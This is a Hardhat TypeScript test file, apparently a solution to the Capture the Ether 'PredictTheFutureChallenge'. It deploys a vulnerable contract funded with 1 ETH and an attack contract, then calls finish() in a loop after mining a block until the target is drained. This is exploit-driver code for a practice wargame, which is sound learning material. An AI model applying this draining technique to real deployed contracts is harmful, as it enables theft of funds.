import { mine } from '@nomicfoundation/hardhat-network-helpers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const AttackFactory = await ethers.getContractFactory('PredictTheFutureAttack');
    const attack = await AttackFactory.deploy(target.address, { value: utils.parseEther('1') });

    const tx = await attack.start();
    await tx.wait();

    await mine();

    let iterations = 0;

    while(true) {
      try {
        iterations += 1;

        const tx = await attack.finish();
        await tx.wait();

        break;
      } catch {}
    }

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
